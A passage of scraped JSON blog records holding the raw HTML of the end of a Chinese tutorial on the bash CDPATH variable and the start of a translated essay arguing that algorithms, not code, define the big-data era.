id=\"crayon-594bd586c2cb0598950837-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>虽然上述命令本身没有问题，但你还是需要耗费点额外的精力（虽然很小），尤其是每次这种情况发生时你都不得不这样做。所以，有一个更加优雅的解决方案来处理，就是以如下方式来设定 <code>CDPATH</code> 环境变量。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2cb5053639252\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nexport CDPATH=\".:/home/himanshu\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cb5053639252-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cb5053639252-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2cb5053639252-1\"><span class=\"crayon-e\">export </span><span class=\"crayon-v\">CDPATH</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\".:/home/himanshu\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cb5053639252-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>它的意思是告诉 <code>cd</code> 命令先在当前的工作目录查找该目录，然后再尝试搜寻 <code>/home/himanshu</code> 目录。当然， <code>cd</code> 命令是否以这样的方式运行，完全取决于你的偏好和要求 – 讨论这一点的目的是为了让你知道这种情况可能会发生。</p>\n<p>就如你现在所知道的，一旦环境变量 <code>CDPATH</code> 被设置，它的值 – 或者它所包含的路径集合 – 就是系统中 <code>cd</code> 命令搜索目录的地方 ( 当然除了使用绝对路径的场景 )。所以，完全取决于你来确保该命令行为的一致性。</p>\n<p>继续说，如果一个 bash 脚本以相对路径使用 <code>cd</code> 命令，最好还是先清除或者重置环境变量 <code>CDPATH</code>，除非你觉得遇上不可预测的麻烦也无所谓。还有一个可选的方法，比起在终端使用 <code>export</code> 命令来设置 <code>CDPATH</code>，你可以在测试完当前的 shell 是交互式还是非交互式之后，再在你的 <code>.bashrc</code> 文件里设置环境变量，这样可以确保你对环境变量的改动只对交互式 shell 生效。</p>\n<p>环境变量中，路径出现的顺序同样也是很重要。举个例子，如果当前目录是在 <code>/home/himanshu</code> 目录之前列出来，<code>cd</code> 命令就会先搜索当前的工作目录然后才会搜索 <code>/home/himanshu</code> 目录。然而，如果该值为 <code>/home/himanshu:.</code>，搜索就首先从 <code>/home/himanshu</code> 开始，然后到当前目录。不用说，这会影响 <code>cd</code> 命令的行为，并且不注意路径的顺序可能会导致一些麻烦。</p>\n<p>要牢记在心的是，环境变量 <code>CDPATH</code>，就像其名字表达的，只对 <code>cd</code> 命令有作用。意味着在 <code>/home/himanshu/Downloads</code> 目录里面时，你能运行 <code>cd Desktop</code> 命令来切换到 <code>/home/himanshu/Desktop</code> 目录，但你不能使用 <code>ls</code>。以下是一个例子:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2cba071492860\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pwd\r\n/home/himanshu/Downloads\r\n$ ls Desktop\r\nls: cannot access Desktop: No such file or directory\r\n$\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cba071492860-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cba071492860-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cba071492860-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cba071492860-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cba071492860-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cba071492860-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2cba071492860-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cba071492860-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">himanshu</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">Downloads</span></div><div class=\"crayon-line\" id=\"crayon-594bd586c2cba071492860-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls </span><span class=\"crayon-e\">Desktop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cba071492860-4\"><span class=\"crayon-v\">ls</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cannot </span><span class=\"crayon-e\">access </span><span class=\"crayon-v\">Desktop</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">No </span><span class=\"crayon-e\">such </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">directory</span></div><div class=\"crayon-line\" id=\"crayon-594bd586c2cba071492860-5\"><span class=\"crayon-sy\">$</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cba071492860-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>然而，这还是有简单的变通处理的。例如，我们可以用以下不怎么费力的方式来达到目的:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2cbe904969838\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cd Desktop/;ls\r\n/home/himanshu/Desktop\r\nbackup backup~ Downloads gdb.html outline~ outline.txt outline.txt~\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cbe904969838-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cbe904969838-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cbe904969838-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cbe904969838-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2cbe904969838-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">Desktop</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cbe904969838-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">himanshu</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">Desktop</span></div><div class=\"crayon-line\" id=\"crayon-594bd586c2cbe904969838-3\"><span class=\"crayon-e\">backup </span><span class=\"crayon-v\">backup</span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloads </span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">html </span><span class=\"crayon-v\">outline</span><span class=\"crayon-o\">~</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">outline</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">outline</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-o\">~</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cbe904969838-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>不过，不是每种情况就能变通处理的。</p>\n<p>另一个重点是：就像你可能已经观察到的，每次你使用 <code>CDPATH</code> 环境变量集来运行 <code>cd</code> 命令时，该命令都会在输出里显示你切换到的目录的完整路径。不用说，不是所有人都想在每次运行 <code>cd</code> 命令时看到这些信息。</p>\n<p>为了确保该输出被制止，你可以使用以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2cc1072564597\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias cd='&gt;/dev/null cd'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd586c2cc1072564597-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd586c2cc1072564597-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd586c2cc1072564597-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">cd</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'&gt;/dev/null cd'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd586c2cc1072564597-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果 <code>cd</code> 命令运行成功，上述命令不会输出任何东西，如果失败，则允许产生错误信息。</p>\n<p>最后，假如你遇到设置 <code>CDPATH</code> 环境变量后，不能使用 shell 的 tab 自动补全功能的问题，可以尝试安装并启用 bash 自动补全（bash-completion）。更多请参考 <a href=\"http://bash-completion.alioth.debian.org/\">这里</a>。</p>\n<h3 id=\"toc_3\">总结</h3>\n<p><code>CDPATH</code> 环境变量时一把双刃剑，如果没有掌握完善的知识和随意使用，可能会令你陷入困境，并花费你大量宝贵时间去解决问题。当然，这不代表你不应该去试一下；只需要了解一下所有的可用选项，如果你得出结论，使用 <code>CDPATH</code> 会带来很大的帮助，就继续使用它吧。</p>\n<p>你已经能够熟练地使用 <code>CDPATH</code> 了吗？你有更多的贴士要分享？请在评论区里发表一下你的想法吧。</p>\n<p>请使用手机”扫一扫”x</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110845\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110845votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110845\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/23426c26d6b88a782a1d894de8e89bca.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/04/11", "praise_nums": 1}
{"tags": " 5 评论 ,算法,代码,IT技术", "front_image_path": "full/506f77aba037cb2bd78064b80470760038a6d491.jpg", "title": "未来是属于算法的，不是代码", "url_object_id": "3c3d477dded1f683e01a23eb62219059", "url": "http://blog.jobbole.com/110841/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/huangxiaofei\">黄小非</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://hackernoon.com/the-future-is-algorithms-not-code-64cacca3b908#.2sdlw4gsb\">hackernoon</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>大数据的时代已经来临。数据带来的狂潮就犹如又一次工业革命一样席卷着人类。在大数据的时代，人类对世界的理解方法从<strong>有限具体</strong>向<strong>抽象</strong>过渡，这也就是为什么算法比代码更加重要的原因。</p>\n<h3 id=\"b8db\" class=\"graf graf--h3 graf-after--p\">说到大数据……</h3>\n<p id=\"8222\" class=\"graf graf--p graf-after--h3\">如果把人类的历史压缩到一天，那么我们可以忽略之前的时间，直接从晚上11点07分开始说起。这本该是安静的一天，但是就在这一天快结束的短短的时段里，突然产生出大量的知识和信息，需要在人与人之间进行传播。你可以想象一下，之前，人类的知识和信息的传播方式是通过口口相传，代代相传，由父到子，师授徒承的方式来进行的。而在某一个时刻，人类社会所产生出的知识和信息的体量已经达到了传统方式无法承载的地步。</p>\n<p id=\"d7c4\" class=\"graf graf--p graf-after--p\">我们需要某种方式来对如此规模的知识和信息进行存储和传播。以前，采用书写的方式记录知识和信息，被认为是人类社会的重大技术革新。然而，柏拉图在《斐德罗篇》中写道：“苏格拉抵对采用书本进行知识传承的方法表示担忧，因为他认为书本并不能激发真正的知识和智慧，正确的方法应该是口口相传。”</p>\n<p id=\"94c3\" class=\"graf graf--p graf-after--p\">他的观点正好代表了知识和信息的有限传播方法。你和你认识的人通过说话进行直接交流，那么在交流对话过程中就有正向和反向的观点产生。而一本书，则完全不同，这是一种抽象的交流传播方法，因为读者和作者之间并没有直接的交流。书的作者不可能知道是谁，多少人，在什么时候什么地点读了他们的作品。书的作者也许可以根据读者们的情况对作品进行一些优化调整，但是总的来说这还是一种抽象的知识传播和学习的方法。</p>\n<h3 id=\"7113\" class=\"graf graf--h3 graf-after--p\">大数据和等腰三角形</h3>\n<p id=\"f16f\" class=\"graf graf--p graf-after--h3\">大数据时代产生的另外一项重要变革，就是我们会从简单计算向抽象计算过度。也就是形成了定理、符号、算法等等被称之为数学的思想。人类历史上有记载的最早的计算始于公元前 2500 年的美索不达米亚。当时美索不达米亚人需要算出一个装满的谷仓能够养活多少人。</p>\n<p id=\"3be6\" class=\"graf graf--p graf-after--p\">美索不达米亚人的问题是非常具体的。他们的计算问题是为了解决生活中的相应问题。这种一个计算问题对应一个生活中具体问题的模式，就被称作是<strong>有限具体问题</strong>。这也是为什么很多专家认为美索不达米亚人的计算并不是数学的起源。这种有限具体的计算模式一直持续了很久，直到公元前500年的古希腊。那时的毕达哥拉斯学派的学者们开始研究奇怪的三角形的问题。比如：等腰三角形的边长是不是都是整数。</p>\n<p id=\"d2ef\" class=\"graf graf--p graf-after--p\">如果你采用有限具体的方法来解答这类问题，就要像毕达哥拉斯学派的学者们当时做的那样，通过把具体的数字代入进去看情况是不是满足。不过，随着代入数字的数量越来越多，复杂性的问题出现了。你究竟需要代入多少数据，才能最终证明这个命题是真还是假呢？（顺便说一下，这个命题是假的，不可能所有等腰三角形的边长都是整数。）等腰三角形边长问题的不同之处在于，它是不具体的。因为这个命题没有限定三角形的面积，也没有限定边长范围。因此可能的情况是无穷多的。不过一旦你开始把理性思维应用到大量数字上，那么就形成了数学思想。这也就是大数据的意思。毕达哥拉斯学派的思维方式将人类带向了更接近抽象的数学本质，我们今天也在用符号、规则系统以及理性的思维来解决这类抽象的问题。</p>\n<p id=\"3f2f\" class=\"graf graf--p graf-after--p\">也许你能在人类历史上找出更多关于大数据的例子，但是从本文的目的出发，我则要直接跳到20世纪，来看看编码是如何兴起，以及如何在现代科技世界中扮演重要角色的。</p>\n<h3 id=\"c917\" class=\"graf graf--h3 graf-after--p\">编程的兴起</h3>\n<p id=\"3210\" class=\"graf graf--p graf-after--h3\">编码，或者叫编程（我们在这里认为这两个词是一个意思）首次出现在历史舞台，要追溯到美国女海军少将Grace Hooper女士1945年在哈佛Mark I型计算机上工作的那个年代。在此之前，电脑（Computer）这个词，现在大家都这么叫，就是单纯的“计算机器”。第二次世界大战期间，发射火炮需要参照一个弹道表来计算弹道。弹道表上的数据，是用偏微分方程代入上百个不同的参数因子算出来的，这些参数包括：距离，海拔，风速，温度，湿度等等。顺便说一下，“电脑”（Computer）这个词，是军方用来形容那些战争期间操作计算机器的女性操作员的。这些女性操作员以“电脑”而闻名。她们需要把计算卡插入计算机器，然后摇动手柄解出方程。制作一张计算卡当时需要170个人月的工作量。</p>\n<p id=\"96c3\" class=\"graf graf--p graf-after--p\">编程的出现，源于人们想找到一种更简单的方式来执行计算过程。如果我们能够为计算机器设计一套指令，让硬件能够根据指令来执行操作，那么那些对机器的手工操作就可以淘汰了。</p>\n<p id=\"5eb3\" class=\"graf graf--p graf-after--p\">这种方式听上去是不是很耳熟？美索不达米亚人采用泥板来进行计算，而编程则是20世纪人类使用的“新泥板”。尽管编程看上去比泥板要先进多了，但是本质上都是对具体问题进行的有限计算。只是用编程的方式计算效率更高。编程淘汰了手动计算的方式，让人类有能力去处理大量的数据。</p>\n<h3 id=\"03cc\" class=\"graf graf--h3 graf-after--p\">算法 vs. 代码</h3>\n<blockquote id=\"090e\" class=\"graf graf--pullquote graf-after--h3\"><p>算法：用一系列步骤来描述解决某种问题的思想，执行这些步骤后可以达到问题的正确性条件和终结条件。算法是对计算的一种抽象描述，与具体的实现无关。</p></blockquote>\n<blockquote id=\"722b\" class=\"graf graf--pullquote graf-after--pullquote\"><p>代码：计算机的一套指令集。在特定平台上使用特定的计算机语言对计算问题进行具体实现。</p></blockquote>\n<p id=\"f3fb\" class=\"graf graf--p graf-after--pullquote\">计算机提供的指令操作的方式让人类可以通过算法来实现复杂的计算。而算法本身却是远在编程发明之前就存在的。穆斯林数学家Al-Khawarizm在公元820年就提出了一次和二次方程的求根算法。而算法（Algorithm）这个词就是从Al-Khawarizm的名字的拉丁语译名“Algoritmi”演变而来，“代数”（Algebra）这个词则是来自于阿拉伯语“al-jabr”，这是Al-Khawarizm在解二次方程时所用的一个步骤的名称。算法要求其步骤或指令是有限的，可实现的，而且能得到结果。正如我们所见，编程可以直接给计算机下指令。这种方式正好对实现算法非常有利，因为从本质上来说，编程就是让计算机按照一定的顺序执行不同的指令。</p>\n<p class=\"graf graf--p graf-after--p\">在大数据时代的早期，我们要处理的信息量大大增加。不过通过设计和应用，可以让我们在编程方面取得优势，再加上“摩尔定律”带来的机器性能上的进步，让我们有能力处理人类世界日益增长的数字化需求。但是用计算机解决有限具体问题的本质并没有变，因为人类是通过写代码来告诉计算机硬件具体需要执行哪些操作。不管这些操作本身有多复杂，但是终究还是来自于人类的指令。不过，算法已经展示出了巨大的潜力，或许能开创一个全新的抽象时代。</p>\n<h3 id=\"910e\" class=\"graf graf--h3 graf-after--p\">算法的兴起</h3>\n<p class=\"graf graf--p graf-after--h3\">从下面这个角度，我们可以看到算法与编码的巨大不同：你可以用代码实现算法。并且，算法的不同实现方式会影响算法的性能。例如，使用binary heap来搜索序列中的最大或最小元素就比较高效，用来排序则没那么高效。但是你会编程并不意味着你能设计算法，这和你能唱歌不一定就能写歌是一个道理。</p>\n<p class=\"graf graf--p graf-after--p\">所有人都知道，“摩尔定律”预言的硬件性能的增长刺激了数字化经济的发展，但是很少有人知道，在很多领域，算法带来的性能增长远比硬件来得更高。实际上，根据2010年的联邦报告显示，算法在语音识别，自然语言处理，物流等方面都带来了显著的性能增长。</p>\n<blockquote id=\"26b6\" class=\"graf graf--pullquote graf--startsWithDoubleQuote graf-after--p\"><p>“尽管公众的理解程度并不高，但是仍然不能掩盖其卓越的效果——在许多领域，算法的进步带来的性能增长要远超CPU计算速度增长的贡献。”——节选自“致总统和国会的报告：设计数字化未来”</p></blockquote>\n<h3 id=\"1bee\" class=\"graf graf--h3 graf-after--pullquote\">抽象算法</h3>\n<p id=\"48a4\" class=\"graf graf--p graf-after--h3\">我们在目前的这个时代需要处理的数据量，让我们必须放弃之前具体有限的思维方式。这是大数据迫使我们这么做的。大数据迫使我们必须后退一步，这是抽象的一步，以便于我们能够找到一种有效的方法，来处理当今时代汹涌泛滥的数据潮流。传统的做法是，你写一段代码，通过特定的参数或模式来对数据库进行搜索。比如，你要搜索“客户数据库”，找出在两周内购买2件以上物品，且支出超过30欧元的客户有哪些。你想给这类客户提供一些建议。所以你提供一种模式去搜索这些用户的数据。但是，大数据的方式是正好相反的，你需要通过大量的数据来找出模式是什么样的。</p>\n<p id=\"8db7\" class=\"graf graf--p graf-after--p\">试想一下。这里有海量的数据，人类无法从中直观地找出模式。这时你就必须再退一步。这抽象的一步是为了让我们利用聚类，分类，机器学习等为基础的新方法（而不是具体的程序代码），从数据中找出有用的模式。这一步的关键在于，要找出你我看不见的模式。就像是光谱里的波长一样，人的肉眼是看不出来的，如果数据超过了一定的体量，那模式就不再直观了。这种超过一定体量，我们无法直接看出模式的数据，就叫做大数据。</p>\n<p id=\"70bf\" class=\"graf graf--p 